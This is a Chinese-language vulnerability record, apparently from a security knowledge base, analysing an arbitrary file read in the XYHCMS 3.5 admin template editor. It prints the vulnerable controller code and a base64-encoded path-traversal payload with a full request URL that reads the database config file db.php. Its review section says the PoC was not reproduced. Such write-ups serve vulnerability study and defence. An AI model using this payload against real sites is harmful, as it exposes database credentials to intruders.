---
source: "hatch 补库批 20260928"
product: "XYHCMS3.5"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "XYHCMS 3.5 后台任意文件读取"
prerequisites: "来源所述条件，未列明部分仍待核：backendTempletspermission; GETbase64fname; Windowsbackslashpath andreadpermissions"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-2190ffd80e7ffd15c64b78d7"
entity_id: "ve-2190ffd80e7ffd15c64b78d7"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：backendTempletspermission; GETbase64fname; Windowsbackslashpath andreadpermissions

- **结论使用边界（1）**：GET读取绕过POST后缀校验分支分析清楚，完整源码有价值。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：PoCBase64编码包含双反斜线表示，需说明实际字节/Windows路径，不泛化Linux。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（3）**：fname经过trim/htmlspecialchars但不防穿越，措辞应目录边界未限制而非完全无处理。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（4）**：缺修复/原始来源/响应，不从读分支推写分支同样任意PHP。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# XYHCMS 3.5 后台任意文件读取

一、漏洞简介
------------

二、漏洞影响
------------

XYHCMS 3.5

三、复现过程
------------

### 漏洞分析

漏洞文件位置：`/App/Manage/Controller/TempletsController.class.php`
第59-83行：

    public function edit() {
            $ftype     = I('ftype', 0, 'intval');
            $fname     = I('fname', '', 'trim,htmlspecialchars');
            $file_path = !$ftype ? './Public/Home/' . C('CFG_THEMESTYLE') . '/' : './Public/Mobile/' . C('CFG_MOBILE_THEMESTYLE') . '/';
            if (IS_POST) {
                if (empty($fname)) {
                    $this->error('未指定文件名');
                }
                $_ext     = '.' . pathinfo($fname, PATHINFO_EXTENSION);
                $_cfg_ext = C('TMPL_TEMPLATE_SUFFIX');
                if ($_ext != $_cfg_ext) {
                    $this->error('文件后缀必须为"' . $_cfg_ext . '"');
                }
                $content  = I('content', '', '');
                $fname    = ltrim($fname, './');
                $truefile = $file_path . $fname;
                if (false !== file_put_contents($truefile, $content)) {
                    $this->success('保存成功', U('index', array('ftype' => $ftype)));
                } else {
                    $this->error('保存文件失败，请重试');
                }
                exit();
            }
            $fname = base64_decode($fname);
            if (empty($fname)) {
                $this->error('未指定要编辑的文件');
            }
            $truefile = $file_path . $fname;

            if (!file_exists($truefile)) {
                $this->error('文件不存在');
            }
            $content = file_get_contents($truefile);
            if ($content === false) {
                $this->error('读取文件失败');
            }
            $content = htmlspecialchars($content);

            $this->assign('ftype', $ftype);
            $this->assign('fname', $fname);
            $this->assign('content', $content);
            $this->assign('type', '修改模板');
            $this->display();
        }

这段函数中对提交的参数进行处理，然后判断是否POST数据上来，如果有就进行保存等，如果没有POST数据，将跳过这段代码继续向下执行。

我们可以通过GET传入fname，跳过前面的保存文件过程，进入文件读取状态。

对fname进行base64解码，判断fname参数是否为空，拼接成完整的文件路径，然后判断这个文件是否存在，读取文件内容。

对fname未进行任何限制，导致程序在实现上存在任意文件读取漏洞。

### 漏洞复现：

登录网站后台，数据库配置文件路径：`\App\Common\Conf\db.php`我们将这段组成相对路径，`..\\..\\..\\App\\Common\\Conf\\db.php`，然后进行base64编码，`Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==`

最后构造的链接形式如下：`http://www.0-sec.org/xyhai.php?s=/Templets/edit/fname/Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==`
